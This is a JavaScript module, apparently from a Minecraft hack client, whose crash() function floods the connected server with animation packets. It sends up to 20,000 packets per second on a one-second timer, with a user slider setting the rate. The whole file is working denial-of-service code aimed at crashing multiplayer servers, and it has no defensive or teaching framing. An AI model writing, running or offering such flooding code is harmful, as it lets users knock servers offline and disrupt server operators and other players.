export function init(parent) {

  parent.crshInter = null;

  parent.settings = [
    {
      name: "PPS",
      type: "Slider",
      min: 20,
      max: 20000,
      step: 10,
      current: 5000
    }
  ]

  function crash() {
    if (ModAPI.player != null) {
      for (let i = 0; i < parent.settings[0].current; i++) {
        //@ts-ignore
        ModAPI.network.addToSendQueue(
          //@ts-ignore
          ModAPI.reflect
            .getClassById(
              "net.minecraft.network.play.client.C0APacketAnimation"
            )
            .constructors[0]()
        );
      }
    } else {
      parent.disable();
    }
  }

  parent.onEnable = function () {
    parent.crshInter = setInterval(crash, 1000);
  }

  parent.onDisable = function () {
    if (parent.crshInter != null) {
      clearInterval(parent.crshInter);
    }
  }
}